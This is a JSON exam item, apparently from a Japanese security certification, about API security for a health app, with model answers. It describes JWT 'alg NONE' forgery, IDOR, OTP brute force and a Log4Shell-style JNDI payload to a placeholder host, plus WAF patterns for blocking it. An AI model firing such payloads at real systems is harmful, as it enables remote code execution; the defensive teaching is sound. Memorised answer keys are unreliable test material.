{
  "qNo": 1,
  "theme": "APIセキュリティと脆弱性対策",
  "description": "G社は、ヘルスケアサービス新興企業であり、利用者が食事、体重などを入力して、そのデータを管理したり、健康リスクの判定や食事メニューのアドバイスを受けたりできるサービス(以下,サービスYという)を計画している。具体的には、クラウドサービス上にサービス Y用のシステム(以下,Sシステムという)を構築し、G社が開発したスマートフォン専用アプリケーションプログラム(以下,G社スマホアプリという)からアクセスする。\n\n## 図1 Sシステムの要件(抜粋)\n\n| 要件 | 内容 |\n|---|---|\n| 要件1 | 利用者が入力したデータを蓄積する。 |\n| 要件2 | 蓄積したデータを機械学習で学習し、その結果を利用して健康リスクの判定や食事メニューのアドバイスを利用者に提供する。 |\n| 要件3 | 利用者のステータス(以下、利用者ステータスという)として、“有償利用者”と“無償利用者”を定義する。有償利用者の場合,全ての機能を利用できる。無償利用者の場合,機能の利用に一部制限がある。 |\n| 要件4 | 可能な限り、既存のサービスやライブラリを使って構築する。 |\n\nG社は、Sシステムの構築を IT ベンダーF 社に委託し、クラウドサービスプロバイダE社のクラウドサービス上にSシステムを構築する方針にした。\n\n### API の設計\n\nS システムには、将来的には他社が提供するスマートフォン専用アプリケーションプログラムからもアクセスすることを想定し, RESTful API 方式のAPI (以下,SシステムのAPIをS-API という)を用意する。RESTful API の設計原則の一つにセッション管理を行わないという性質がある。この性質を `[ a ]` という。\n\n## 表1 E社が提供するクラウドサービスのサービス一覧(抜粋)\n\n| サービス名 | サービス概要 |\n|---|---|\n| サービス K | API ゲートウェイサービスである。当該サービスは、APIへのリクエストを受信し、その内容に基づき、サービスLを呼び出す。 |\n| サービス L | イベント駆動型のコンピューティングサービスである。サービスKからの呼出しがあったとき、又は指定された日時に、事前に定義された処理を実行する。また、外部サービスと連携する。 |\n| サービス M | マネージド型のデータベースサービスである。 |\n| サービス N | マネージド型の WAF サービスである。サービスKが受信した API へのリクエストを検査して、許可・検知・遮断を行う。 |\n| 注記 | Sシステムの構築時点では、サービスNを導入しない計画である。 |\n\n## 図2 サービスYのシステム構成\n\n```mermaid\ngraph TD\n    SM[スマートフォン] --> Internet\n    MA[メールアプリ] --> Internet\n    Internet --> CS[E社クラウドサービス]\n\n    subgraph SM_Apps [スマートフォン]\n        GSMA[G社スマホアプリ]\n    end\n\n    subgraph CS\n        subgraph S_System [Sシステム]\n            SK[サービスK]\n            SL[サービスL]\n            SMDB[サービスM]\n        end\n        ES[外部サービス]\n    end\n\n    GSMA --> Internet\n    Internet --> SK\n    SK --> SL\n    SL --> SMDB\n    SL --> ES\n\n    %% 注記: サービスK及びサービスLからインターネットへの通信は許可されている。\n```\n\n## 図3 S-API 呼出し時の動作概要(抜粋)\n\n```mermaid\nsequenceDiagram\n    participant App as G社スマホアプリ\n    participant K as サービスK (API GW)\n    participant L as サービスL (Compute)\n    participant M as サービスM (DB)\n\n    App ->> K: S-API Request\n    activate K\n    K ->> L: Call Service L\n    activate L\n    L ->> M: Read/Write Data (If needed)\n    activate M\n    M -->> L: Data/Response\n    deactivate M\n    L -->> K: Response\n    deactivate L\n    K -->> App: Response\n    deactivate K\n```\n\n## 表2 S-API の仕様(抜粋)\n\n| API 名 | 概要 | メソッド | パラメータ |\n|---|---|---|---|\n| 認証 API | ・利用者IDとパスワードを検証する。\\n・一致した場合、数字4桁の文字列Xをメール送信。\\n・文字列Xとotpを検証。一致でJWTを発行。 | POST | mid (利用者ID), pass (パスワード)\\nmid (利用者ID), otp (文字列) |\n| 利用者 API | ・利用者情報を取得、更新する。\\n・共通モジュールPを利用。P呼出し処理はサービスLに定義。 | GET | mid (利用者ID) |\n| | | PUT | mid (利用者ID), name (名前), age (年齢) |\n| 注記 | Sシステムは、表中のパラメータのほか、HTTP リクエストのヘッダに含まれる情報を用いて処理を行う。 | | |\n\n### JWT を利用したアクセス\n\nJWTは、ヘッダ, ペイロード, 署名の3要素から構成され、base64urlエンコードされ「.」で結合される。ヘッダにはアルゴリズム、ペイロードには利用者IDや有効期限が含まれる。SシステムはF社開発のJWT 管理ライブラリ(ライブラリQ)を利用し、JWTを検証する。\n\n### 機械学習による学習と判定・アドバイス\n\n健康リスク判定や食事メニューのアドバイスに外部の機械学習サービスを利用する。学習は日次バッチ処理（午前1時起動、サービスLに定義）で、サービスMからデータを取り出し、外部サービスに入力する。\n\n## 図4 Sシステムの仕様(抜粋)\n\n[上記内容のまとめ]\n\n### 脆弱性診断の結果\n\nU社による診断レポートを表3に示す。\n\n## 表3 U社による診断レポート (抜粋)\n\n| 項番 | 名称 | 対象 API | 脆弱性 |\n|---|---|---|---|\n| 1 | JWT 改ざんによるなりすまし | 全体 | ヘッダとペイロードを改ざんした JWT を送信すると、他の利用者へのなりすましが可能である。 |\n| 2 | アクセス制御の不備 A | 利用者 API | パラメータ mid に他の利用者 ID を指定すると、他の利用者 IDにひも付く利用者情報を取得、改変できてしまう。 |\n| 3 | アクセス制御の不備 B | 利用者 API | 更新時にパラメータ \"status\" を追加して送信すると、利用者ステータスを無償利用者から有償利用者に改変できてしまう。 |\n| 4 | 2 要素認証の突破 | 認証 API | 1秒間に10回試行する総当たり攻撃を行った場合,文字列 X の検証において、平均的な認証成功までの時間は `[ b ]` 秒になり、突破される可能性が高い。 |\n\nJWTのデコード結果（表4）では、アルゴリズムはRS256が使われていたが、「RS256」の代わりに「NONE」を指定し、利用者IDを改ざんしたJWTでなりすましが成功した。\n\nRさんが取りまとめた脆弱性の分析と対策案を表5に示す。\n\n## 表5 脆弱性の分析と対策案\n\n| 表3の項番 | 分析 | 対策案 |\n|---|---|---|\n| 1 | (省略) | ①ライブラリ Qを修正する。 |\n| 2 | (省略) | ②P呼出し処理に処理を追加する。 |\n| 3 | 利用者 API の仕様には、パラメータ “status”の指定について定義されていない。一方、実装は、指定されたパラメータを検証せず全て `[ c ]` に送信していた。ここで、送信内容を改ざんしてパラメータ “status” を追加してリクエストを送信すると、`[ c ]` は利用者ステータスを変更できる。 | プログラムの修正で対応する。 |\n| 4 | (省略) | 次の対策を実施する。\\n - `[ d ]` を実装する。そのしきい値は10とする。\\n - 突破される可能性を十分に低減するために、文字列Xを数字6桁に変更する。 |\n\n### セキュリティの強化\n\nログ取得モジュールを実装しなくても、サービスN（WAF）を導入することで、通信ログを取得できる。\n\n## 図5 サービス N における WAF ルールの記述形式\n\nルールは、[検証対象], [パターン] 及び [動作]の三つを1行に記述する。\n\n* **[検証対象]**：GET, POST, PUT, ANY, Header, COOKIE, Multipart。\n* **[パターン]**：正規表現要素 (^, \\W, x|y, (x|y)z, [xyz], ., \\., *)。\n* **[動作]**：許可, 検知, 遮断。\n\n### 新たな脆弱性への対応\n\nライブラリHに脆弱性Vが公表された。\n\n## 図6 脆弱性Vについての関連情報(抜粋)\n\n脆弱性Vは、JNDI Lookupを悪用した攻撃によって発生し、攻撃対象サーバ（Sシステム）にコマンドCを実行させることができる（LDAP経由）。攻撃コードはHTTPリクエストの `x-api-version` ヘッダの値として送信される。\n\nRさんは、Z氏の助言に基づき、システムに影響を与えない検証を実施した。\n\n## 図7 Rさんが実施した検証手順\n\n1. 攻撃用LDAP/HTTPサーバを兼ねたテストサーバを構築する。\n2. 図8に示す検証コードを作成する。\n3. `[ ③ ]` 図8で指定したコマンドが実行されたことを確認する仕組みをテストサーバに実装する。\n4. 検証コードをHTTP リクエスト中に指定してSシステムに送信する。\n\n## 図8 作成した検証コード\n\n```\n${jndi:ldap://a2.b2.c2.d2:1389/Command/Base64/d2d LdCBodHRwOi8vYTIuYjIuYzIuZDIvaW5kZXgu\naHRtbA==}\n```\n\n検証の結果、外部から脆弱性Vを悪用できることが確認できた。Rさんは暫定的な WAF ルール案を表6に示す。\n\n## 表6 WAF ルールの案\n\n| ルール | 検証対象 | パターン | 動作 |\n|---|---|---|---|\n| 1 | `[ e ]` | \\Wjndi\\W | 遮断 |\n| 2 | `[ f ]` | \\WLdap\\W | 遮断 |\n\nRさんは、大文字・小文字を入れ替える手口による回避に気づき、`[ ④ ]` このような手口にも対応できるように案を変更した。その後、Z氏は、`[ ⑤ ]` 本番運用開始後の一定期間においては、WAF ルールの動作に“検知”を設定して、サービス Y が今までどおり利用できるかを確認することを助言した。\n",
  "questions": [
    {
      "subQNo": "設問1",
      "text": "本文中の `[ a ]` に入れる適切な字句を答えよ。",
      "explanation": "### 設問1 解説\n\n`[ a ]` は、RESTful APIの設計原則の一つである「セッション管理を行わない性質」を指しています。これは、リクエストがそれ以前やそれ以降のリクエストから独立しており、サーバがクライアントの状態を保持しないことを意味します。この性質を**ステートレス性（Statelessness）**と呼びます。\n\n**解答:** ステートレス",
      "subQuestions": [],
      "point": 10
    },
    {
      "subQNo": "設問2",
      "text": "〔脆弱性診断の結果〕について答えよ。",
      "explanation": "設問2は、JWTの脆弱性やアクセス制御の不備、認証の突破に関する分析と対策についての問題です。",
      "subQuestions": [
        {
          "label": "(1)",
          "text": "表3中の `[ b ]` に入れる適切な数値を、小数点以下を四捨五入して,整数で答えよ。",
          "explanation": "### 設問2 (1) 解説\n\n脆弱性4は、数字4桁の文字列Xを総当たり攻撃で突破される可能性に関するものです。\n\n1.  **文字列Xの総パターン数**: 数字4桁なので $10^4 = 10,000$ 通りです。\n2.  **平均的な成功試行回数**: 総当たり攻撃では、平均して総パターン数の半分の試行で成功すると考えられます。 $10,000 / 2 = 5,000$ 回。\n3.  **平均的な成功時間**: 攻撃は1秒間に10回試行されるため、かかる時間は $5,000 \text{回} / 10 \text{回/秒} = 500 \text{秒}$ です。\n\n**解答:** 500",
          "point": 10
        },
        {
          "label": "(2)",
          "text": "表5中の下線①について、修正後のライブラリ Qで行う JWT の検証では、どのようなデータに対してどのような検証を行うか。検証対象となるデータと検証の内容を、それぞれ20字以内で答えよ。",
          "explanation": "### 設問2 (2) 解説\n\n下線①は、表3項番1（JWT改ざん）への対策です。この脆弱性は、JWTヘッダの `alg` パラメータを `NONE` に設定することで、署名検証をスキップし、他の利用者へのなりすましが成功したために発生しました。\n\nJWT管理ライブラリQの修正では、署名検証のスキップを許容しないようにする必要があります。\n\n*   **検証対象となるデータ**: JWTのヘッダに含まれるアルゴリズム情報 (`alg`) の値です。\n*   **検証の内容**: その `alg` の値が、署名検証を行うことが前提となるもの（例：RS256）であるかを確認し、`NONE` のような無効な値や署名検証を行わない設定を拒否することです。\n\n**解答:** \n*   検証対象となるデータ: JWTヘッダのalgの値\n*   検証の内容: algが署名検証用かを確認",
          "point": 10
        },
        {
          "label": "(3)",
          "text": "表5中の下線②について、P呼出し処理に追加すべき処理を、40字以内で具体的に答えよ。",
          "explanation": "### 設問2 (3) 解説\n\n下線②は、表3項番2（アクセス制御の不備 A）への対策です。脆弱性は、利用者APIのパラメータ `mid` に他人のIDを指定することで、他人の情報にアクセスできてしまうというもので、認可の不備です。\n\n利用者APIへのアクセス時には、認証成功後に発行されたJWTが使われています。JWTのペイロードには、認証済みの利用者自身のIDが含まれています。サービスL内のP呼出し処理が共通モジュールPを呼び出す前に、リクエストに含まれる `mid` が、JWTで識別された利用者自身のIDと一致するかを確認する必要があります。\n\n**解答:** JWT内の利用者IDとパラメータmidの値が一致するか確認し、不一致なら処理を中断する。",
          "point": 10
        },
        {
          "label": "(4)",
          "text": "表5中の `[ c ]` に入れる適切な字句を、表2中の用語で答えよ。",
          "explanation": "### 設問2 (4) 解説\n\n表5項番3の分析によると、`[ c ]` は、APIが受け取った指定されたパラメータを検証せず全て送られ、かつ「利用者ステータスを変更できる」機能を持ちます。表2の利用者APIの概要によれば、利用者情報の取得・更新は、サービスLに定義されたP呼出し処理を介して、F社開発の「利用者管理共通ライブラリ(共通モジュールP)」が利用され、サービスMを呼び出しています。\n\nリクエストパラメータを受け取り、DB操作の実行主体となるのは**共通モジュールP**です。\n\n**解答:** 共通モジュールP",
          "point": 10
        },
        {
          "label": "(5)",
          "text": "表5中の `[ d ]` に入れる適切な処理内容を、30字以内で答えよ。",
          "explanation": "### 設問2 (5) 解説\n\n`[ d ]` は、脆弱性4（2要素認証の突破）への対策案で、しきい値10を設定する仕組みです。これは、総当たり攻撃を防ぐためのレート制限（認証試行回数制限）です。\n\n**解答:** 一定時間内の認証失敗回数がしきい値を超えた場合、認証試行を禁止する。",
          "point": 10
        }
      ]
    },
    {
      "subQNo": "設問3",
      "text": "〔新たな脆弱性への対応〕について答えよ。",
      "explanation": "設問3は、ライブラリHの脆弱性V（JNDIインジェクション/Log4Shellに類似）に対する暫定的なWAF対策に関する問題です。",
      "subQuestions": [
        {
          "label": "(1)",
          "text": "図7中の下線③について、テストサーバに実装する仕組みを、35字以内で具体的に答えよ。",
          "explanation": "### 設問3 (1) 解説\n\n攻撃が成功した場合、攻撃対象サーバ（Sシステム）は図8にデコードされたコマンドC、すなわち `wget http://a2.b2.c2.d2/index.html` を実行します。a2.b2.c2.d2はテストサーバのIPアドレスです。この `wget` の実行は、テストサーバのWebサーバ機能に対して `index.html` の取得リクエストとして現れます。\n\nコマンド実行の成否を確認するためには、このリクエストをテストサーバ側で捕捉する必要があります。\n\n**解答:** テストサーバのWebサーバへのアクセスログを記録する仕組み。",
          "point": 10
        },
        {
          "label": "(2)",
          "text": "表6中の `[ e ]`, `[ f ]` に入れる適切な字句を、図5中から選び答えよ。",
          "explanation": "### 設問3 (2) 解説\n\n表6のWAFルールは、脆弱性Vが悪用された際のパターン（jndi, Ldap）を検出するためのものです。図6の攻撃の流れ(3)によると、攻撃コードは「HTTP リクエストの x-api-version ヘッダの値として指定」されます。\n\n図5のWAFルールの記述形式において、ヘッダの値を検証対象とするのは `Header` です。攻撃パターンがヘッダに含まれるため、`Header` を選択します。\n\n**解答:** Header",
          "point": 10
        },
        {
          "label": "(3)",
          "text": "本文中の下線④の変更後の案について、表6中のルール1に記述すべきパターンを、図5の記述形式で答えよ。",
          "explanation": "### 設問3 (3) 解説\n\n下線④では、大文字・小文字を入れ替える手口（例: `jnDI`）によるパターン回避に対応するように、正規表現を修正します。\n\n元のパターンは `\\Wjndi\\W` です。大文字・小文字の区別をなくすために、図5で定義されている文字集合 `[xyz]` を使います。\n\n`j` に対応: `[Jj]`\n`n` に対応: `[Nn]`\n`d` に対応: `[Dd]`\n`i` に対応: `[Ii]`\n\n前後には非英数字を示す `\\W` を残します。\n\n**解答:** \\W[Jj][Nn][Dd][Ii]\\W",
          "point": 10
        },
        {
          "label": "(4)",
          "text": "本文中の下線⑤について, WAF ルールの動作に“遮断”ではなく“検知”を設定することによる利点と、“検知”に設定した際に被害を最小化するために実施すべき内容を、それぞれ25字以内で答えよ。",
          "explanation": "### 設問3 (4) 解説\n\nWAFルールを暫定的に適用する際、誤検知（正規の通信を攻撃と誤判定すること）が発生する可能性があります。「遮断」に設定すると、誤検知でサービス利用が妨げられますが、「検知」であれば通信は通過します。\n\n*   **利点**: 誤検知が発生しても正規利用者の通信を妨げずサービス継続性を確保できること。\n*   **被害を最小化するために実施すべき内容**: 検知ログを監視し、攻撃や誤検知を迅速に把握し対応すること。（検知ログを分析し、ルール精度の改善や恒久対策の準備を進める）\n\n**解答:**\n*   利点: 誤検知が発生しても正規利用者の通信を妨げずサービス継続性を確保できること。\n*   実施すべき内容: 検知ログを監視し、攻撃や誤検知を迅速に把握し対応すること。",
          "point": 10
        }
      ]
    }
  ]
}